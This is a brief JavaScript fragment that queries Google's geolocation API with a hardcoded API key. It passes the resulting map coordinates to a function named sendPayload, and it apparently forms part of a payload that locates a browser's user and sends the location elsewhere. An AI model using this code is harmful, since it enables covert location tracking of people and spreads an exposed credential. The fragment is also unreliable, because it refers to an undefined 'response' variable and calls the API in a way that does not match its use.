var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        sendPayload("https://www.google.com/maps/@" + response.location.lat + "," + response.location.lng + ",15z")        
    }
  };
xhttp.open("GET", "https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyA_GNQd8gxKgfBdkDiDkdBnsVkDAa3Aeew", true);                   
xhttp.send();
